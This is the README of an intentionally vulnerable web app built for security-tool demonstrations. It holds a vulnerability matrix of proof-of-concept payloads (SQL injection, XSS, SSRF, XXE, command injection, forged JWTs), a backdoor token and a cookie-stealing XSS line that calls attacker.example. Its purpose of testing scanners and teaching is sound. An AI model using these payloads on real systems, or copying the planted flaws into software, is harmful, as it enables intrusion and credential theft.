<p align="center">
  <img src="frontend/public/logo.svg" alt="BadBugny — a bunny in sunglasses riding a Harley-style motorbike" width="320" />
</p>

# BadBugny 🐰🏍️

> *The fastest bunny in the garage — and the most exploitable.*

> ⚠️ **WARNING — INTENTIONALLY VULNERABLE APPLICATION**
>
> BadBugny is a deliberately broken web application built **for security
> tooling demonstrations and security education only**. It contains
> exploitable vulnerabilities in source code, in third-party dependencies,
> and as hardcoded secrets. **Never expose it to the internet, never run
> it on a host that has access to credentials or networks you care about,
> and never reuse any code from it in production.**
>
> Run it on an isolated VM, in a disposable Docker host, or behind a
> firewall that blocks all outbound traffic from the containers.

BadBugny is a whitetie playground for evaluating SCA, SAST, DAST,
IAST and secret-scanning tooling. It is small enough to read end-to-end
(≈1k LOC across two services) yet covers the most common web vulnerability
classes plus several "AI-detectable, traditional-tool-blind" patterns.
Every challenge is themed around our mascot: a sunglasses-wearing bunny
tearing through the garage on a Harley-style motorbike. Rev it up. 🏍️

---

## Stack

| Component | Tech | Purpose |
|---|---|---|
| Backend | **Go 1.21**, gin v1.7.7, jwt-go v3.2.0, lib/pq, satori/go.uuid v1.2.0, gopkg.in/yaml.v2 v2.2.2 | The vulnerable HTTP API (`:8080`) |
| Frontend | **Node 18 + React 18 (Vite)**, axios 0.21.0, lodash 4.17.4, marked 0.3.6, jquery 3.4.0, moment 2.18.1, handlebars 4.0.5, minimist 1.2.0, serialize-javascript 1.4.0 | The web UI (`:3000`) |
| Database | **PostgreSQL 15** | Persistent state (users, comments, files, notes) |

Three containers, one `docker compose up`.

---

## Quick start

Requirements: Docker 24+ with `docker compose` v2.

```bash
git clone <this repo> badbugny-vuln
cd badbugny-vuln
docker compose up --build
```

First run takes 1–3 minutes (Go + npm install). Then open:

- Web UI ............. http://localhost:3000
- Backend API ........ http://localhost:8080
- Postgres ........... localhost:5432  (user `badbugny`, password `badbugny_pwd_super_secret`)

To wipe state:

```bash
docker compose down -v
```

### Default credentials (auto-seeded)

| Username | Password    | Role  | Balance |
|----------|-------------|-------|---------|
| admin    | `admin123`  | admin | 99,999  |
| alice    | `password1` | user  | 1,000   |
| bob      | `hunter2`   | user  | 500     |

Passwords are stored as plain MD5 — see VULN-CRYPTO below.

---

## Repo layout

```
badbugny-vuln/
├── docker-compose.yml
├── README.md
├── backend/                      Go service (vulnerable API)
│   ├── Dockerfile
│   ├── go.mod                    pinned vulnerable deps
│   ├── main.go                   routing + JWT middleware (alg-confusion + backdoor)
│   ├── secrets.go                hardcoded secrets (CWE-798) for secret scanners
│   ├── crypto.go                 MD5 + custom XOR
│   ├── db.go                     Postgres bootstrap + seed
│   ├── models.go                 User / Comment / FileRecord / Note
│   ├── handlers_auth.go          login, register, password reset, ping
│   ├── handlers_users.go         IDOR, mass-assignment, race condition, admin SQL
│   ├── handlers_files.go         upload, download (path traversal)
│   ├── handlers_comments.go      stored XSS sink + path SQLi
│   └── handlers_misc.go          XSS reflected, SSRF, XXE, RCE, SSTI, deserialization, debug
└── frontend/                     React/Vite SPA (vulnerable client)
    ├── Dockerfile
    ├── package.json              pinned vulnerable npm deps
    ├── vite.config.js
    ├── .env                      hardcoded VITE_* secrets
    ├── index.html
    └── src/
        ├── main.jsx
        ├── App.jsx               open redirect + nav
        ├── api.js                axios + JWT in localStorage
        ├── style.css
        └── components/
            ├── Login.jsx         renders error JSON via dangerouslySetInnerHTML
            ├── Register.jsx      forwards arbitrary fields (mass-assignment)
            ├── Profile.jsx       DOM XSS via location.hash
            ├── Search.jsx        DOM XSS + prototype pollution
            ├── Comments.jsx      stored-XSS rendering sink
            ├── Files.jsx         upload + path-traversal download
            ├── Tools.jsx         Handlebars RCE / eval / SSRF / XXE / cmd inj
            ├── Notes.jsx         IDOR demo
            └── Admin.jsx         broken access control + raw SQL panel
```

---

## Vulnerability matrix

### Web vulnerabilities (≥ 20, all exploitable)

| # | CWE | Class | Where | Quick PoC |
|---|---|---|---|---|
| 1 | CWE-89 | SQL Injection (auth bypass) | `POST /api/login` (handlers_auth.go) | `{"username":"admin' -- ","password":"x"}` |
| 2 | CWE-915 | Mass Assignment | `POST /api/register` | `{"username":"mallory","password":"p","role":"admin","balance":1000000}` |
| 3 | CWE-330/200 | Predictable + leaked password-reset token | `POST /api/forgot-password` | response includes `reset_token` |
| 4 | CWE-89 | 2nd-order SQLi via reset token | `POST /api/reset-password` | `{"token":"' UNION SELECT 1 -- "}` |
| 5 | CWE-209/598 | Verbose errors + token in URL | many endpoints | error JSON includes raw SQL; `?token=…` accepted |
| 6 | CWE-639 | IDOR | `GET /api/users/:id` | login as bob; `GET /api/users/1` reveals admin api_key |
| 7 | CWE-89/915 | Dynamic SQL UPDATE (mass-assign) | `PUT /api/users/:id` | `{"role":"admin","balance":99999}` for any id |
| 8 | CWE-362/840 | Race condition + missing positivity check | `POST /api/transfer` | `{"to_user_id":2,"amount":-1000}` (steal); or replay concurrently |
| 9 | CWE-862 | Missing authorization | `GET /api/notes/:id` | bob fetches `id=1` (admin's note) |
| 10 | CWE-285/345 | Weak admin check (JWT-claim only) | `GET /api/admin/users` | forge alg=none JWT with `role:admin` |
| 11 | CWE-89 | Arbitrary SQL | `POST /api/admin/exec-sql` | `{"sql":"DROP TABLE comments"}` |
| 12 | CWE-22 | Path Traversal | `GET /api/download?file=../../etc/passwd` | reads container files |
| 13 | CWE-434 | Unrestricted file upload | `POST /api/upload` | upload `shell.html` then visit `/api/download?file=shell.html` |
| 14 | CWE-200 | Filesystem-path disclosure | `GET /api/files/:id` | returns server `path` |
| 15 | CWE-79 | Stored XSS | `POST /api/comments`, render in `Comments.jsx` | `{"post_id":1,"body":"<img src=x onerror=alert(1)>"}` |
| 16 | CWE-89 | SQLi via path & ORDER BY | `GET /api/comments/:postId?order=…` | `/api/comments/1;SELECT pg_sleep(5)--` |
| 17 | CWE-79 | Reflected XSS | `GET /api/search?q=<script>alert(1)</script>` | server uses `text/template` |
| 18 | CWE-601 | Open redirect (server) | `GET /api/redirect?url=https://evil.example/` | 302 |
| 19 | CWE-918 | SSRF | `GET /api/fetch?url=http://169.254.169.254/latest/meta-data/` | proxies any URL |
| 20 | CWE-611 | XXE | `POST /api/parse-xml` with `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | reads files / SSRF |
| 21 | CWE-78 | OS Command Injection | `POST /api/exec` `{"host":"127.0.0.1; id"}` | shell concatenation |
| 22 | CWE-1336 | Server-Side Template Injection | `GET /api/render?template=welcome.tpl&name=…` | `{{exec "id"}}` after writing a template |
| 23 | CWE-502 | Insecure deserialization (YAML) | `POST /api/import` | YAML keys mass-assign; vulnerable yaml.v2 |
| 24 | CWE-200/489 | Debug info disclosure | `GET /api/debug` | dumps env, JWT secret, AWS keys |
| 25 | CWE-942 | CORS misconfiguration | every endpoint | `Origin: https://evil` reflected with `Access-Control-Allow-Credentials: true` |
| 26 | CWE-352 | No CSRF protection | every state-changing endpoint | combined with CORS misconfig → drive-by |
| 27 | CWE-113 | HTTP header injection | `GET /api/ping?msg=…%0d%0aSet-Cookie:%20p=1` | header echo |
| 28 | CWE-95 | `eval()` of user input | Tools page → "Calculator" | type `fetch('/api/debug').then(r=>r.json()).then(alert)` |
| 29 | CWE-79 | DOM XSS via `location.hash` | `Profile.jsx` | `/profile#<img src=x onerror=alert(1)>` |
| 30 | CWE-1321 | Prototype pollution (lodash 4.17.4) | `Search.jsx` `_.merge` of URL hash | `#filters=%7B%22__proto__%22%3A%7B%22polluted%22%3A1%7D%7D` |
| 31 | CWE-1321 | Prototype pollution (minimist 1.2.0) | `Tools.jsx` querystring | `?--__proto__.x=1` |
| 32 | CWE-79 | Markdown XSS (marked 0.3.6) | `Search.jsx` markdown preview | `[x](javascript:alert(1))` |
| 33 | CWE-79 | Handlebars 4.0.5 prototype-access RCE/XSS | `Tools.jsx` template renderer | abuse `{{#with}}` chains |
| 34 | CWE-922 | Insecure JWT storage in localStorage | `api.js` | exfil via any XSS above |
| 35 | CWE-601 | Client-side open redirect | `App.jsx` `?next=…` | `/?next=https://evil.example` |
| VULN-CRYPTO | CWE-327, CWE-916 | MD5 password hashing + custom XOR "encryption" | `crypto.go` | rainbow-tables / linear-time keystream recovery |
| VULN-JWT | CWE-345 / CVE-2020-26160 | jwt-go v3.2.0; alg not validated; weak HS256 secret in code; `?token=` accepted; backdoor token | `main.go AuthMiddleware` | forge any role |

That's **30+ distinct web vulns**, well above the requested 20.

### "Easier for AI to detect than for traditional tools"

These are deliberately included because they require *reasoning about
behaviour or business intent* rather than matching a known sink/source
pair:

- **Negative-amount transfer** (`POST /api/transfer` with `amount:-1000`) —
  no scanner has a rule for "amount must be positive"; an LLM reading
  the handler spots it instantly.
- **TOCTOU race** in the same handler — concurrent transfers
  double-spend because there's no transaction. Hard for SAST without
  taint flow + concurrency analysis.
- **Mass-assigned `role` field** in `POST /api/register` — looks like
  benign struct-decoding to a regex; trivial for an LLM that reads the
  whole handler.
- **JWT signing-method confusion** — the parser callback returns the
  HMAC secret unconditionally; the alg can be `none`. SAST that does
  not model jwt.Parse miss it; AI catches it from the callback
  semantics.
- **Reset token leaked in JSON response** — secret-scanners look for
  hardcoded credentials, not for "this token was just generated and is
  now in the response body".
- **`api_key` returned by IDOR** — SAST sees a generic field; an LLM
  recognises the column name and that it's the user's own credential
  shipped to a different user.
- **Custom XOR "crypto"** in `crypto.go` — pattern-based scanners do
  not flag homemade ciphers; AI does.
- **`text/template` chosen in an HTML response** in `Search` — tools
  that recognise html/template's auto-escape often miss the absence of
  it; an LLM reads the import alias and notices.
- **Backdoor admin token** in middleware — pattern-match scanners flag
  the literal string as a secret, but the *behavioural* significance
  ("any caller sending this string becomes admin") needs reasoning.

### "Easy for one tool, hidden from another"

By design, the same surface is intended to be discovered by some scanner
families and missed by others. Use this matrix to grade your tooling:

| Vuln | SCA | SAST | DAST | IAST | Secrets |
|---|:-:|:-:|:-:|:-:|:-:|
| Hardcoded AWS / Stripe / GitHub keys (`secrets.go`, `.env`) | ✗ | partial | ✗ | ✗ | ✓ |
| Vulnerable `lodash` 4.17.4 / `axios` 0.21.0 / `gin` 1.7.7 / `yaml.v2` 2.2.2 / etc. | ✓ | ✗ | ✗ | ✗ | ✗ |
| Reflected XSS in `/api/search` | ✗ | ✓ | ✓ | ✓ | ✗ |
| Stored XSS in `/api/comments` | ✗ | ✓ | partial (needs flow) | ✓ | ✗ |
| SQLi in path param `/api/comments/:postId` | ✗ | ✓ | partial | ✓ | ✗ |
| Race condition / negative-amount in `/api/transfer` | ✗ | partial | ✗ | partial | ✗ |
| JWT alg-confusion in middleware | ✗ | partial | hard | partial | ✗ |
| CORS misconfig | ✗ | partial | ✓ | partial | ✗ |
| Debug endpoint dump (`/api/debug`) | ✗ | partial | ✓ (crawl) | ✓ | partial (key shapes) |
| Server-Side Template Injection (`/api/render`) | ✗ | ✓ | partial (active probe) | ✓ | ✗ |

✓ = expected to detect, ✗ = generally won't, partial = depends on
configuration / rules / probe coverage.

---

## Hardcoded secrets (for secret scanners)

Detectable patterns intentionally embedded in the repo:

| Where | Type |
|---|---|
| `backend/secrets.go` | AWS access key + secret (AWS docs example shape) |
| `backend/secrets.go` | Stripe live secret (`sk_live_…`) |
| `backend/secrets.go` | GitHub PAT (`ghp_…`) |
| `backend/secrets.go` | Slack incoming webhook |
| `backend/secrets.go` | Google API key (`AIza…`) |
| `backend/secrets.go` | SendGrid API key (`SG.…`) |
| `backend/secrets.go` | RSA PRIVATE KEY block |
| `backend/secrets.go` | DB credentials + JWT signing secret + admin backdoor |
| `frontend/.env` | `VITE_GOOGLE_MAPS_API_KEY`, `VITE_SEGMENT_WRITE_KEY` |
| `frontend/src/main.jsx` | telemetry token in client bundle |
| `docker-compose.yml` | DB password + AWS keys via env |

Run e.g.:

```bash
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect -s /repo -v
docker run --rm -v "$PWD":/repo trufflesecurity/trufflehog:latest filesystem /repo
```

---

## Vulnerable dependencies (for SCA scanners)

### Backend (`backend/go.mod`)

- `github.com/dgrijalva/jwt-go v3.2.0+incompatible` — deprecated, CVE-2020-26160
- `github.com/gin-gonic/gin v1.7.7` — CVE-2023-26125, CVE-2023-29401
- `gopkg.in/yaml.v2 v2.2.2` — CVE-2019-11254 (DoS)
- `github.com/satori/go.uuid v1.2.0` — CVE-2021-3538 (predictable UUIDs)
- `github.com/gin-contrib/cors v1.3.0` — older permissive defaults

### Frontend (`frontend/package.json`)

- `axios@0.21.0` — CVE-2020-28168 (SSRF)
- `lodash@4.17.4` — CVE-2019-10744 (prototype pollution), and others
- `marked@0.3.6` — multiple XSS bypasses
- `jquery@3.4.0` — CVE-2020-11022/11023
- `moment@2.18.1` — CVE-2017-18214 (ReDoS)
- `handlebars@4.0.5` — CVE-2019-19919 (prototype access → RCE)
- `minimist@1.2.0` — CVE-2020-7598 (prototype pollution)
- `serialize-javascript@1.4.0` — CVE-2019-16769

Try:

```bash
docker run --rm -v "$PWD":/repo aquasec/trivy:latest fs --scanners vuln,secret,misconfig /repo
docker run --rm -v "$PWD":/repo anchore/grype:latest dir:/repo
```

---

## Exploitation walk-through (5-minute demo)

1. **SQLi auth bypass** — `curl -s localhost:8080/api/login -d
   '{"username":"admin'\''-- ","password":"x"}' -H 'content-type: application/json'`
   → returns admin JWT.
2. **Mass-assignment self-promotion** — register at the UI with role `admin`,
   log in, hit `/admin`.
3. **CORS / drive-by transfer** — open DevTools on any other origin and
   `fetch('http://localhost:8080/api/transfer',{method:'POST',
   credentials:'include',body:JSON.stringify({to_user_id:2,amount:-1000})})`.
4. **SSRF cloud metadata** — `/api/fetch?url=http://169.254.169.254/latest/meta-data/`.
5. **Stored XSS** — post a comment containing
   `<img src=x onerror=fetch('//attacker.example/?'+document.cookie)>`.
6. **Path traversal** — `/api/download?file=../../etc/passwd`.
7. **Cmd injection** — `POST /api/exec` with
   `{"host":"127.0.0.1; cat /etc/shadow"}`.
8. **JWT alg=none** — forge a token with header
   `{"alg":"none","typ":"JWT"}` and payload `{"user_id":1,"role":"admin"}`,
   send it to `/api/admin/users`.
9. **Backdoor token** — any endpoint with `?token=let_me_in_pls_2026`.
10. **Debug leak** — `GET /api/debug`.

---

## Tooling demo recipes

### SAST

```bash
# Semgrep (community + p/security-audit)
docker run --rm -v "$PWD":/src returntocorp/semgrep:latest \
  semgrep --config p/security-audit --config p/owasp-top-ten /src
```

### SCA

```bash
docker run --rm -v "$PWD":/repo aquasec/trivy:latest fs /repo
# or:
docker run --rm -v "$PWD":/repo anchore/grype:latest dir:/repo
```

### Secret scanning

```bash
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect -s /repo -v
docker run --rm -v "$PWD":/repo trufflesecurity/trufflehog:latest filesystem /repo
```

### DAST

Spin the app up (`docker compose up`), then point an active scanner at
`http://localhost:8080` (API) and `http://localhost:3000` (UI):

```bash
docker run --rm -t --network host owasp/zap2docker-stable zap-baseline.py \
  -t http://localhost:3000
docker run --rm -t --network host owasp/zap2docker-stable zap-api-scan.py \
  -t http://localhost:8080/api -f openapi
```

### IAST

The Go binary is plain — instrument with your IAST agent of choice
(e.g. Contrast Go), point it at the same `:8080`, drive traffic with
the DAST runs above, and compare findings.

---

## Resetting state / common ops

- **Reset DB and uploads**: `docker compose down -v && docker compose up`
- **Hot-reload backend**: `docker compose up --build backend`
- **Logs**: `docker compose logs -f backend`
- **Open a psql shell**: `docker compose exec db psql -U badbugny -d badbugny`

---

## Responsible-use note

This repository exists for defensive education and security-tool
evaluation. By cloning or running it you agree to:

- not deploy BadBugny on a publicly reachable host,
- not use any of the included credentials, tokens, or key shapes
  against any third-party service,
- not reuse the vulnerable code or dependency versions in any other
  project.

If you find a way to make BadBugny *more* useful as a tooling demo
(e.g. a vulnerability class we missed), PRs welcome.
